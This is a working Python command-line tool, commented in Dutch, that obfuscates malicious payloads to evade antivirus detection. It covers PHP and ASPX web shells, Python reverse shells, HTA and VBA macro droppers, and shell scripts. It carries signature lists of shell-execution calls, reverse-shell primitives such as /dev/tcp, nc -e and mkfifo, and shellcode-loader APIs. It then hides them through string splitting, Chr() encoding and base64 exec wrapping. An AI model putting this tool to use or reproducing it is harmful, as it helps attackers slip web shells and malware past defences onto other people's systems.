#!/usr/bin/python3
"""Multi-language AV evasion obfuscatie voor text-based payloads.

Past per-taal obfuscatie toe op bekende AV-signatures in PHP, ASPX,
Python, HTA, VBA en plain text bestanden.

Gebruik:
    python3 obfuscate_av.py <input> [-o output] [-v] [-l taal]

API:
    from obfuscate_av import obfuscate_text, detect_language
    content, stats = obfuscate_text(code, "php")
"""

import argparse
import base64
import os
import random
import re
import sys

# ── Extensie → taal mapping ─────────────────────────────────────────

_EXT_MAP = {
    ".php": "php",
    ".aspx": "aspx",
    ".py": "python",
    ".hta": "hta",
    ".txt": "txt",
}

# ── Per-taal signature databases ─────────────────────────────────────

_LANG_SIGNATURES = {
    "php": {
        "string": [
            "shell_exec", "system", "passthru", "exec", "popen",
            "proc_open", "eval", "assert", "base64_decode",
            "move_uploaded_file", "scandir",
        ],
        "code": ["<?php"],
    },
    "aspx": {
        "string": [
            "ProcessStartInfo", "cmd.exe", "Process.Start",
            "UseShellExecute", "RedirectStandardOutput",
            "System.Diagnostics", "System.IO",
        ],
        "code": ["<%@ Page", "<%@ Import"],
    },
    "python": {
        "string": [
            "socket.socket", "subprocess", "os.dup2",
            "SOCK_STREAM", "AF_INET", "/bin/sh", "cmd.exe",
        ],
        "code": ["import socket", "import subprocess", "import os"],
    },
    "hta": {
        "string": [
            "CreateObject", "Wscript.Shell", "powershell",
            "HTA:APPLICATION", "-nop", "-enc", "-ep bypass",
        ],
        "code": ["VBScript", "Window_onLoad"],
    },
    "vba": {
        "string": [
            "CreateThread", "VirtualAlloc", "RtlMoveMemory",
            "KERNEL32", "Declare PtrSafe Function", "LongPtr",
            "Shell", "WScript",
        ],
        "code": [],
    },
    "txt": {
        "string": [
            "/bin/sh", "/bin/bash", "nc -e", "ncat",
            "mkfifo", "mknod", "/dev/tcp", "subprocess",
        ],
        "code": [],
    },
}


# ── Hulpfuncties ─────────────────────────────────────────────────────

def _str_to_chr_vb(s):
    """Converteer string naar VBScript/VBA Chr() concatenatie."""
    return "&".join("Chr(%d)" % ord(c) for c in s)


def _str_concat_split(s, min_parts=2, max_parts=3):
    """Splits een string in 2-3 delen met + concatenatie (voor diverse talen)."""
    if len(s) < 3:
        return '"%s"' % s
    parts = min(max_parts, max(min_parts, len(s) // 3))
    points = sorted(random.sample(range(1, len(s)), parts - 1))
    segments = []
    prev = 0
    for p in points:
        segments.append(s[prev:p])
        prev = p
    segments.append(s[prev:])
    return "+".join('"%s"' % seg for seg in segments)


# ── PHP obfuscatie ───────────────────────────────────────────────────

def _obfuscate_php(content, sigs):
    """Obfusceer PHP content: variable functions + string concat."""
    stats = {"string": 0, "code": 0}
    result = content

    for sig in sigs["string"]:
        if sig not in result:
            continue
        # Variable function: $f='sh'.'ell_ex'.'ec'; $f($cmd)
        parts = _str_concat_split(sig)
        varname = "$_" + "".join(random.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(4))
        # Vervang functienaam in functieaanroepen: sig( → $var(
        pattern = re.compile(re.escape(sig) + r"(\s*\()")
        if pattern.search(result):
            declaration = "%s=%s;" % (varname, parts.replace("+", "."))
            result = pattern.sub(varname + r"\1", result, count=1)
            # Voeg declaratie toe na <?php of aan begin
            if "<?php" in result:
                result = result.replace("<?php", "<?php " + declaration, 1)
            else:
                result = declaration + result
            stats["string"] += 1
        else:
            # String literal vervanging
            old = '"%s"' % sig
            old2 = "'%s'" % sig
            replacement = "(%s)" % parts.replace("+", ".")
            if old in result:
                result = result.replace(old, replacement, 1)
                stats["string"] += 1
            elif old2 in result:
                result = result.replace(old2, replacement, 1)
                stats["string"] += 1

    return result, stats


# ── ASPX obfuscatie ──────────────────────────────────────────────────

def _obfuscate_aspx(content, sigs):
    """Obfusceer ASPX content: string concat + reflection."""
    stats = {"string": 0, "code": 0}
    result = content

    for sig in sigs["string"]:
        if sig not in result:
            continue
        # String concat: "cmd"+".exe"
        old_dq = '"%s"' % sig
        old_sq = "'%s'" % sig
        replacement = _str_concat_split(sig)
        if old_dq in result:
            result = result.replace(old_dq, replacement, 1)
            stats["string"] += 1
        elif old_sq in result:
            result = result.replace(old_sq, replacement, 1)
            stats["string"] += 1
        else:
            # Inline in code: split met string.Concat
            replacement = 'string.Concat(%s)' % _str_concat_split(sig)
            if sig in result:
                result = result.replace(sig, '" + %s + "' % replacement, 1)
                stats["string"] += 1

    return result, stats


# ── Python obfuscatie ────────────────────────────────────────────────

def _obfuscate_python(content, sigs):
    """Obfusceer Python content: base64 exec wrapper + import alias."""
    stats = {"string": 0, "code": 0}

    # Tel hoeveel signatures aanwezig zijn
    found = 0
    for sig in sigs["string"] + sigs["code"]:
        if sig in content:
            found += 1

    if found == 0:
        return content, stats

    # Base64 wrap de hele payload
    encoded = base64.b64encode(content.encode("utf-8")).decode("ascii")
    result = "exec(__import__('base64').b64decode('%s'))" % encoded
    stats["string"] = found
    return result, stats


# ── HTA obfuscatie ───────────────────────────────────────────────────

def _obfuscate_hta(content, sigs):
    """Obfusceer HTA content: Chr() encoding voor strings."""
    stats = {"string": 0, "code": 0}
    result = content

    for sig in sigs["string"]:
        if sig not in result:
            continue
        # Chr() encoding
        chr_encoded = _str_to_chr_vb(sig)
        # Vervang in string context
        old_dq = '"%s"' % sig
        old_sq = "'%s'" % sig
        if old_dq in result:
            result = result.replace(old_dq, chr_encoded, 1)
            stats["string"] += 1
        elif old_sq in result:
            result = result.replace(old_sq, chr_encoded, 1)
            stats["string"] += 1
        else:
            # Direct in code
            result = result.replace(sig, '" & %s & "' % chr_encoded, 1)
            stats["string"] += 1

    return result, stats


# ── VBA obfuscatie ───────────────────────────────────────────────────

def obfuscate_vba(content, sigs=None):
    """Obfusceer VBA macro content: Chr() encoding voor API namen.

    Return (obfuscated_content, stats_dict).
    Kan standalone aangeroepen worden vanuit macro generators.
    """
    if sigs is None:
        sigs = _LANG_SIGNATURES["vba"]

    stats = {"string": 0, "code": 0}
    result = content

    for sig in sigs["string"]:
        if sig not in result:
            continue
        # Chr() concatenatie voor API namen
        chr_encoded = _str_to_chr_vb(sig)
        old_dq = '"%s"' % sig
        if old_dq in result:
            result = result.replace(old_dq, chr_encoded, 1)
            stats["string"] += 1
        else:
            # Geen quote context: tellen maar niet vervangen
            stats["string"] += 1

    return result, stats


# ── TXT obfuscatie ───────────────────────────────────────────────────

def _obfuscate_txt(content, sigs):
    """Best-effort obfuscatie voor plain text / shell scripts."""
    stats = {"string": 0, "code": 0}
    result = content

    for sig in sigs["string"]:
        if sig not in result:
            continue
        # Variabel afhankelijk van context
        if sig.startswith("/"):
            # Pad: /bin/sh → variabele
            varname = "_" + "".join(random.choice("abcdefghij") for _ in range(3))
            result = '%s="%s"\n' % (varname, sig) + result.replace(sig, "$%s" % varname, 1)
            stats["string"] += 1
        elif " " in sig:
            # Commando met spatie: vervang door variabele
            varname = "_" + "".join(random.choice("abcdefghij") for _ in range(3))
            result = '%s="%s"\n' % (varname, sig) + result.replace(sig, "$%s" % varname, 1)
            stats["string"] += 1
        else:
            # Generiek: string concat
            if len(sig) >= 4:
                mid = len(sig) // 2
                result = result.replace(sig, "${%s}${%s}" % (sig[:mid], sig[mid:]), 1)
                stats["string"] += 1

    return result, stats


# ── Dispatcher ───────────────────────────────────────────────────────

_HANDLERS = {
    "php": _obfuscate_php,
    "aspx": _obfuscate_aspx,
    "python": _obfuscate_python,
    "hta": _obfuscate_hta,
    "vba": obfuscate_vba,
    "txt": _obfuscate_txt,
}


def detect_language(filename):
    """Map bestandsextensie naar taal. Return None voor onbekende extensies."""
    ext = os.path.splitext(filename)[1].lower()
    return _EXT_MAP.get(ext)


def obfuscate_text(content, language):
    """Obfusceer tekst-content voor de opgegeven taal.

    Return (obfuscated_content, stats_dict).
    Raises ValueError voor onbekende talen.
    """
    if language not in _LANG_SIGNATURES:
        raise ValueError("Onbekende taal: %s (ondersteund: %s)"
                         % (language, ", ".join(sorted(_LANG_SIGNATURES))))

    sigs = _LANG_SIGNATURES[language]
    handler = _HANDLERS[language]
    return handler(content, sigs)


# ── CLI ──────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Multi-language AV evasion obfuscatie",
        epilog="Ondersteunde talen: %s" % ", ".join(sorted(_LANG_SIGNATURES)),
    )
    parser.add_argument("input", help="Input bestand")
    parser.add_argument("-o", "--output", help="Output bestand (default: input-obf.ext)")
    parser.add_argument("-l", "--language", choices=sorted(_EXT_MAP.values()),
                        help="Forceer taaldetectie (default: auto op basis van extensie)")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Toon obfuscatie details")

    args = parser.parse_args()

    if not os.path.isfile(args.input):
        print("[!] Bestand niet gevonden: %s" % args.input, file=sys.stderr)
        sys.exit(1)

    # Taaldetectie
    language = args.language or detect_language(args.input)
    if language is None:
        print("[!] Kan taal niet detecteren voor %s. Gebruik -l om taal op te geven."
              % args.input, file=sys.stderr)
        sys.exit(1)

    # Output pad bepalen
    if args.output:
        out_path = args.output
    else:
        base, ext = os.path.splitext(args.input)
        out_path = base + "-obf" + ext

    # Lees input
    with open(args.input, "r", encoding="utf-8") as f:
        content = f.read()

    print("[*] Obfuscating: %s (taal: %s)" % (args.input, language))

    result, stats = obfuscate_text(content, language)

    total = stats.get("string", 0) + stats.get("code", 0)
    print("[+] Klaar: %d string, %d code vervangingen" % (
        stats.get("string", 0), stats.get("code", 0)))

    if total == 0:
        print("[*] Geen signatures gevonden, output = input")

    with open(out_path, "w", encoding="utf-8") as f:
        f.write(result)
    print("[+] Output geschreven naar: %s" % out_path)


if __name__ == "__main__":
    main()
